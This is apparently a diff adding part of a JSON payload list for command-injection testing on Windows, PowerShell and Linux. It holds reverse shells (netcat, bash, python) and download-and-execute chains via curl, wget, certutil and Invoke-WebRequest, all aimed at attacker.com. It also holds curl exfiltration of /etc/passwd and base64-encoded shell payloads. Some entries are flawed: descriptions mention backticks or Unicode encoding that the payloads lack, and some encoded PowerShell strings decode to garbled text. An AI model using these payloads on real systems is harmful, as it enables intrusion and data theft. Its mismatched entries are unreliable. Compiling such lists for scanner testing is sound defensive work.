+    "id": "cmdinj-052",
+    "description": "Windows cmd injection with | separator",
+    "payload": "| dir",
+    "context": "List directory contents",
+    "type": "Command Injection",
+    "severity": "high"
+  },
+  {
+    "id": "cmdinj-053",
+    "description": "Windows cmd injection with && separator",
+    "payload": "&& ipconfig",
+    "context": "Display network config",
+    "type": "Command Injection",
+    "severity": "high"
+  },
+  {
+    "id": "cmdinj-054",
+    "description": "Windows cmd injection with || separator",
+    "payload": "|| net user",
+    "context": "List users",
+    "type": "Command Injection",
+    "severity": "high"
+  },
+  {
+    "id": "cmdinj-055",
+    "description": "Windows PowerShell injection with semicolon",
+    "payload": "; Get-Process",
+    "context": "List running processes",
+    "type": "Command Injection",
+    "severity": "high"
+  },
+  {
+    "id": "cmdinj-056",
+    "description": "Windows PowerShell injection with backtick",
+    "payload": "whoami",
+    "context": "Execute whoami",
+    "type": "Command Injection",
+    "severity": "high"
+  },
+  {
+    "id": "cmdinj-057",
+    "description": "Windows PowerShell injection with $()",
+    "payload": "$(Get-ChildItem)",
+    "context": "List directory contents",
+    "type": "Command Injection",
+    "severity": "high"
+  },
+  {
+    "id": "cmdinj-058",
+    "description": "Windows PowerShell injection with Start-Process",
+    "payload": "; Start-Process notepad.exe",
+    "context": "Launch notepad",
+    "type": "Command Injection",
+    "severity": "medium"
+  },
+  {
+    "id": "cmdinj-059",
+    "description": "Windows cmd injection with echo to file",
+    "payload": "& echo injected > C:\\Windows\\Temp\\injected.txt",
+    "context": "Write to file",
+    "type": "Command Injection",
+    "severity": "medium"
+  },
+  {
+    "id": "cmdinj-060",
+    "description": "Windows cmd injection with netcat reverse shell",
+    "payload": "& nc attacker.com 4444 -e cmd.exe",
+    "context": "Reverse shell",
+    "type": "Command Injection",
+    "severity": "critical"
+  },
+  {
+    "id": "cmdinj-061",
+    "description": "macOS/Linux injection with semicolon and whoami",
+    "payload": "; whoami",
+    "context": "Execute whoami",
+    "type": "Command Injection",
+    "severity": "high"
+  },
+  {
+    "id": "cmdinj-062",
+    "description": "macOS/Linux injection with pipe and id",
+    "payload": "| id",
+    "context": "Execute id",
+    "type": "Command Injection",
+    "severity": "high"
+  },
+  {
+    "id": "cmdinj-063",
+    "description": "macOS/Linux injection with && and uname",
+    "payload": "&& uname -a",
+    "context": "System info",
+    "type": "Command Injection",
+    "severity": "high"
+  },
+  {
+    "id": "cmdinj-064",
+    "description": "macOS/Linux injection with backticks and ls",
+    "payload": "ls /",
+    "context": "List root directory",
+    "type": "Command Injection",
+    "severity": "high"
+  },
+  {
+    "id": "cmdinj-065",
+    "description": "macOS/Linux injection with $() and ps",
+    "payload": "$(ps aux)",
+    "context": "List processes",
+    "type": "Command Injection",
+    "severity": "medium"
+  },
+  {
+    "id": "cmdinj-066",
+    "description": "macOS/Linux injection with semicolon and curl download",
+    "payload": "; curl http://attacker.com/malware.sh -o /tmp/m.sh; sh /tmp/m.sh",
+    "context": "Download and execute script",
+    "type": "Command Injection",
+    "severity": "critical"
+  },
+  {
+    "id": "cmdinj-067",
+    "description": "macOS/Linux injection with semicolon and wget download",
+    "payload": "; wget http://attacker.com/malware.sh -O /tmp/m.sh; sh /tmp/m.sh",
+    "context": "Download and execute script",
+    "type": "Command Injection",
+    "severity": "critical"
+  },
+  {
+    "id": "cmdinj-068",
+    "description": "macOS/Linux injection with semicolon and base64 decode",
+    "payload": "; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNjY2Ng== | base64 -d | bash",
+    "context": "Base64 encoded reverse shell",
+    "type": "Command Injection",
+    "severity": "critical"
+  },
+  {
+    "id": "cmdinj-069",
+    "description": "Windows PowerShell injection with encoded command",
+    "payload": "; powershell -EncodedCommand SQBFAFgAUABMAGEAYwBlAC4AZQB4AGU=",
+    "context": "Encoded PowerShell command",
+    "type": "Command Injection",
+    "severity": "high"
+  },
+  {
+    "id": "cmdinj-070",
+    "description": "Windows cmd injection with for loop",
+    "payload": "& for /L %i in (1,1,5) do @echo %i",
+    "context": "Loop command",
+    "type": "Command Injection",
+    "severity": "medium"
+  },
+  {
+    "id": "cmdinj-071",
+    "description": "Windows PowerShell injection with Invoke-Expression",
+    "payload": "; Invoke-Expression 'whoami'",
+    "context": "Execute command",
+    "type": "Command Injection",
+    "severity": "high"
+  },
+  {
+    "id": "cmdinj-072",
+    "description": "macOS/Linux injection with semicolon and env",
+    "payload": "; env",
+    "context": "Print environment variables",
+    "type": "Command Injection",
+    "severity": "medium"
+  },
+  {
+    "id": "cmdinj-073",
+    "description": "macOS/Linux injection with semicolon and cat /etc/passwd",
+    "payload": "; cat /etc/passwd",
+    "context": "Read passwd file",
+    "type": "Command Injection",
+    "severity": "critical"
+  },
+  {
+    "id": "cmdinj-074",
+    "description": "Windows cmd injection with reg query",
+    "payload": "& reg query HKLM\\Software",
+    "context": "Query registry",
+    "type": "Command Injection",
+    "severity": "medium"
+  },
+  {
+    "id": "cmdinj-075",
+    "description": "Windows PowerShell injection with Get-Content",
+    "payload": "; Get-Content C:\\Windows\\System32\\drivers\\etc\\hosts",
+    "context": "Read hosts file",
+    "type": "Command Injection",
+    "severity": "high"
+  },
+  {
+    "id": "cmdinj-076",
+    "description": "macOS/Linux injection with semicolon and dmesg",
+    "payload": "; dmesg",
+    "context": "Kernel messages",
+    "type": "Command Injection",
+    "severity": "medium"
+  },
+  {
+    "id": "cmdinj-077",
+    "description": "macOS/Linux injection with semicolon and netstat",
+    "payload": "; netstat -an",
+    "context": "Network connections",
+    "type": "Command Injection",
+    "severity": "medium"
+  },
+  {
+    "id": "cmdinj-078",
+    "description": "Windows cmd injection with tasklist",
+    "payload": "& tasklist",
+    "context": "List running tasks",
+    "type": "Command Injection",
+    "severity": "medium"
+  },
+  {
+    "id": "cmdinj-079",
+    "description": "Windows PowerShell injection with Get-Service",
+    "payload": "; Get-Service",
+    "context": "List services",
+    "type": "Command Injection",
+    "severity": "medium"
+  },
+  {
+    "id": "cmdinj-080",
+    "description": "macOS/Linux injection with semicolon and ps aux",
+    "payload": "; ps aux",
+    "context": "List processes",
+    "type": "Command Injection",
+    "severity": "medium"
+  },
+  {
+    "id": "cmdinj-081",
+    "description": "Windows cmd injection with echo and pipe",
+    "payload": "& echo injected | findstr injected",
+    "context": "Echo and filter output",
+    "type": "Command Injection",
+    "severity": "medium"
+  },
+  {
+    "id": "cmdinj-082",
+    "description": "Windows PowerShell injection with Start-Process and hidden window",
+    "payload": "; Start-Process notepad.exe -WindowStyle Hidden",
+    "context": "Launch process hidden",
+    "type": "Command Injection",
+    "severity": "medium"
+  },
+  {
+    "id": "cmdinj-083",
+    "description": "macOS/Linux injection with semicolon and curl to exfiltrate data",
+    "payload": "; curl http://attacker.com/?data=$(cat /etc/passwd)",
+    "context": "Exfiltrate data via curl",
+    "type": "Command Injection",
+    "severity": "critical"
+  },
+  {
+    "id": "cmdinj-084",
+    "description": "Windows cmd injection with powershell encoded command",
+    "payload": "& powershell -EncodedCommand JABXAGUAYgA9ACJIZWxsbyBXb3JsZCIiOwAkAFcAZQBiAC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAiADsA",
+    "context": "Encoded PowerShell payload",
+    "type": "Command Injection",
+    "severity": "high"
+  },
+  {
+    "id": "cmdinj-085",
+    "description": "macOS/Linux injection with semicolon and nc reverse shell",
+    "payload": "; nc attacker.com 4444 -e /bin/bash",
+    "context": "Reverse shell via netcat",
+    "type": "Command Injection",
+    "severity": "critical"
+  },
+  {
+    "id": "cmdinj-086",
+    "description": "Windows cmd injection with certutil download",
+    "payload": "& certutil -urlcache -split -f http://attacker.com/malware.exe malware.exe & malware.exe",
+    "context": "Download and execute file",
+    "type": "Command Injection",
+    "severity": "critical"
+  },
+  {
+    "id": "cmdinj-087",
+    "description": "macOS/Linux injection with semicolon and bash reverse shell",
+    "payload": "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
+    "context": "Reverse shell via bash",
+    "type": "Command Injection",
+    "severity": "critical"
+  },
+  {
+    "id": "cmdinj-088",
+    "description": "Windows PowerShell injection with Invoke-WebRequest",
+    "payload": "; Invoke-WebRequest -Uri http://attacker.com/malware.ps1 -OutFile C:\\Windows\\Temp\\m.ps1; powershell -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\m.ps1",
+    "context": "Download and execute PowerShell script",
+    "type": "Command Injection",
+    "severity": "critical"
+  },
+  {
+    "id": "cmdinj-089",
+    "description": "macOS/Linux injection with semicolon and python reverse shell",
+    "payload": "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'",
+    "context": "Reverse shell via python",
+    "type": "Command Injection",
+    "severity": "critical"
+  },
+  {
+    "id": "cmdinj-092",
+    "description": "Command injection using Unicode encoding",
+    "payload": "; echo injected",
+    "context": "Unicode encoded echo command",
+    "type": "Command Injection",
+    "severity": "high"
+  },
+  {
+    "id": "cmdinj-093",
+    "description": "Command injection with double URL encoding",
+    "payload": "%253B%2520id",
+    "context": "Double URL encoded semicolon and id",
+    "type": "Command Injection",
+    "severity": "high"
+  },
+  {
+    "id": "cmdinj-094",
+    "description": "Command injection using variable substitution and command chaining",
+    "payload": "; VAR=whoami; $VAR",
+    "context": "Use variable to execute command",
+    "type": "Command Injection",
+    "severity": "high"
+  },
+  {
+    "id": "cmdinj-095",
+    "description": "Command injection using nested base64 decoding and execution",
+    "payload": "; echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash",
+    "context": "Decode and execute base64 payload",
+    "type": "Command Injection",
+    "severity": "critical"
+  },
+  {
+    "id": "cmdinj-096",
+    "description": "Command injection using less common command separator (newline)",
+    "payload": "&& echo injected\nid",
+    "context": "Use newline as command separator",
+    "type": "Command Injection",
+    "severity": "high"
+  },
+  {
+    "id": "cmdinj-097",
+    "description": "Command injection using PowerShell encoded command with obfuscation",
+    "payload": "; powershell -EncodedCommand JABXAGUAYgA9ACJXaG8gSSBhbSIiOwAkAFcAZQBiAC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAiADsA",
+    "context": "Obfuscated PowerShell encoded command",
+    "type": "Command Injection",
+    "severity": "critical"
+  },
+  {
+    "id": "cmdinj-098",
+    "description": "Command injection using command substitution with nested quotes",
+    "payload": "; echo $(echo \"$(whoami)\")",
+    "context": "Nested command substitution with quotes",
+    "type": "Command Injection",
+    "severity": "high"
+  }
+]
